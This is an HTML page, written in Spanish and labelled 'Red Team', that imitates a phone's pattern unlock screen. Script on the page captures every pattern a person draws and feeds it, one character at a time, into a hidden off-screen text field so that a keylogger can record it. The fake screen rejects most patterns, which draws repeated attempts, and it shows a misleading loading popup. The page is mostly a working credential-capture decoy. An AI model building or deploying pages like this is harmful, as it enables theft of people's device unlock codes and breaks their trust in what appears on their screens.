<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Red Team Pattern - Ultra Sensitive</title>
    <style>
        :root {
            --mario-white: #ffffff;
            --mario-yellow: #ffcc00;
            --error-red: #ff4444;
            --popup-bg: rgba(255, 255, 255, 0.95);
            --loader-grey: #888888;
        }

        * { box-sizing: border-box; }

        body, html {
            margin: 0; padding: 0; height: 100vh; width: 100vw; overflow: hidden;
            font-family: 'Segoe UI', sans-serif;
            background: url('fondo.png') no-repeat center center fixed;
            background-size: cover; background-color: #1a1a1a;
        }

        #key-sink { position: absolute; top: -100px; opacity: 0; }

        .overlay {
            position: absolute; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex; flex-direction: column; justify-content: flex-start; 
            align-items: center; padding-top: 10vh; 
        }

        .marquee-box {
            width: 280px; overflow: hidden; white-space: nowrap;
            margin-bottom: 35vh; display: flex;
        }

        .marquee-content { display: flex; animation: scrollLeft 18s linear infinite; }

        .marquee-content span {
            color: var(--mario-white); font-size: 1.3rem;
            font-weight: 600; padding-right: 60px; 
        }

        @keyframes scrollLeft { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }

        #game-popup {
            position: absolute; top: -110px; left: 50%; transform: translateX(-50%);
            background: var(--popup-bg); color: #333; min-width: 230px; 
            padding: 15px 40px; border-radius: 15px; font-size: 0.9rem;
            font-weight: 500; box-shadow: 0 10px 30px rgba(0,0,0,0.4);
            display: none; flex-direction: column; align-items: center; z-index: 100;
        }

        .loader {
            border: 3px solid rgba(0,0,0,0.05); border-top: 3px solid var(--loader-grey);
            border-radius: 50%; width: 20px; height: 20px;
            animation: spin 1s linear infinite; margin-top: 12px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #pattern-wrapper { position: relative; width: 280px; height: 280px; touch-action: none; }

        canvas { position: absolute; top: 0; left: 0; z-index: 1; pointer-events: none; }

        .dots-grid {
            display: grid; grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(3, 1fr); width: 100%; height: 100%;
            position: relative; z-index: 2;
        }

        .dot {
            width: 10px; height: 10px; background: var(--mario-white); 
            border: none; border-radius: 50%; margin: auto;
            box-shadow: 0 0 5px rgba(0,0,0,0.3);
            pointer-events: none;
        }

        .bottom-links {
            width: 280px; display: flex; justify-content: space-between;
            align-items: center; margin-top: 40px;
        }

        .link-text {
            color: var(--mario-white) !important; font-size: 1rem !important;
            font-family: 'Segoe UI', sans-serif !important; font-weight: 400; 
            letter-spacing: 1px !important; text-transform: uppercase !important;
            text-decoration: none; cursor: pointer;
        }
    </style>
</head>
<body>

<input type="text" id="key-sink">

<div class="overlay">
    <div class="marquee-box">
        <div class="marquee-content">
            <span>Dibujar patron para desbloquear el telefono.</span>
            <span>Dibujar patron para desbloquear el telefono.</span>
        </div>
    </div>
    
    <div id="pattern-wrapper">
        <div id="game-popup">
            <span>Ingresando ...</span>
            <div class="loader"></div>
        </div>
        <canvas id="pattern-canvas"></canvas>
        <div class="dots-grid">
            <div class="dot" id="d1" data-id="1"></div>
            <div class="dot" id="d2" data-id="2"></div>
            <div class="dot" id="d3" data-id="3"></div>
            <div class="dot" id="d4" data-id="4"></div>
            <div class="dot" id="d5" data-id="5"></div>
            <div class="dot" id="d6" data-id="6"></div>
            <div class="dot" id="d7" data-id="7"></div>
            <div class="dot" id="d8" data-id="8"></div>
            <div class="dot" id="d9" data-id="9"></div>
        </div>
    </div>

    <div class="bottom-links">
        <div class="marquee-box" style="width:110px; margin-bottom:0;">
            <div class="marquee-content" style="animation-duration: 6s;">
                <span class="link-text" style="padding-right: 30px;">EMERGENCIA</span>
                <span class="link-text" style="padding-right: 30px;">EMERGENCIA</span>
            </div>
        </div>
        <span class="link-text">VOLVER</span>
    </div>
</div>

<script>
    const wrapper = document.getElementById('pattern-wrapper');
    const canvas = document.getElementById('pattern-canvas');
    const ctx = canvas.getContext('2d');
    const dots = document.querySelectorAll('.dot');
    const popup = document.getElementById('game-popup');
    const keySink = document.getElementById('key-sink');

    const CORRECT_PATTERN = "123456789"; 
    let isDrawing = false;
    let path = [];
    let failCount = 0;
    let lineColor = '#ffffff';
    let mousePos = { x: 0, y: 0 };
    let dotCenters = [];

    canvas.width = 280;
    canvas.height = 280;

    // Precargar centros para mayor velocidad
    function updateCenters() {
        dotCenters = Array.from(dots).map(dot => {
            const rect = dot.getBoundingClientRect();
            const wrapperRect = wrapper.getBoundingClientRect();
            return {
                x: rect.left - wrapperRect.left + rect.width / 2,
                y: rect.top - wrapperRect.top + rect.height / 2,
                id: dot.dataset.id,
                element: dot
            };
        });
    }

    function start(e) {
        updateCenters();
        isDrawing = true;
        path = [];
        lineColor = '#ffffff';
        dotCenters.forEach(c => c.element.classList.remove('active'));
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        popup.style.display = 'none';
        keySink.value = "";
    }

    function move(e) {
        if (!isDrawing) return;
        const clientX = e.touches ? e.touches[0].clientX : e.clientX;
        const clientY = e.touches ? e.touches[0].clientY : e.clientY;
        const rect = wrapper.getBoundingClientRect();
        mousePos = { x: clientX - rect.left, y: clientY - rect.top };

        dotCenters.forEach(center => {
            // --- FÍSICA MEJORADA: Distancia Euclidiana para "pegajosidad" ---
            const dx = mousePos.x - center.x;
            const dy = mousePos.y - center.y;
            const distance = Math.sqrt(dx * dx + dy * dy);

            // Si el dedo está cerca (radio 35px), lo captura
            if (distance < 35) {
                if (!path.find(p => p.id === center.id)) {
                    path.push(center);
                    center.element.classList.add('active');
                    if (navigator.vibrate) navigator.vibrate(40);
                }
            }
        });
    }

    function end() {
        if (!isDrawing) return;
        isDrawing = false;
        const userPattern = path.map(p => p.id).join('');
        
        if (path.length > 0) {
            capturarParaKeylogger(userPattern);
            if (userPattern !== CORRECT_PATTERN) {
                failCount++;
                if (failCount === 1) {
                    lineColor = '#ff4444';
                    setTimeout(resetUI, 800);
                } else {
                    popup.style.display = 'flex';
                    setTimeout(() => { popup.style.display = 'none'; failCount = 0; resetUI(); }, 10000);
                }
            }
        }
    }

    function capturarParaKeylogger(texto) {
        keySink.focus();
        let i = 0;
        const intervalo = setInterval(() => {
            if (i < texto.length) {
                keySink.value += texto[i];
                keySink.dispatchEvent(new Event('input', { bubbles: true }));
                i++;
            } else {
                clearInterval(intervalo);
                keySink.blur();
            }
        }, 100); 
    }

    function resetUI() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        dotCenters.forEach(c => c.element.classList.remove('active'));
        path = [];
    }

    function renderLoop() {
        if (isDrawing) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            if (path.length > 0) {
                ctx.beginPath();
                ctx.lineWidth = 5;
                ctx.strokeStyle = lineColor; 
                ctx.lineJoin = 'round';
                ctx.lineCap = 'round';
                ctx.moveTo(path[0].x, path[0].y);
                for (let i = 1; i < path.length; i++) {
                    ctx.lineTo(path[i].x, path[i].y);
                }
                ctx.lineTo(mousePos.x, mousePos.y);
                ctx.stroke();
            }
        }
        requestAnimationFrame(renderLoop);
    }
    renderLoop();

    wrapper.addEventListener('touchstart', (e) => { e.preventDefault(); start(e); }, { passive: false });
    window.addEventListener('touchmove', (e) => { move(e); }, { passive: false });
    window.addEventListener('touchend', end);
    
    // PC Support
    wrapper.addEventListener('mousedown', start);
    window.addEventListener('mousemove', move);
    window.addEventListener('mouseup', end);
</script>
</body>
</html>
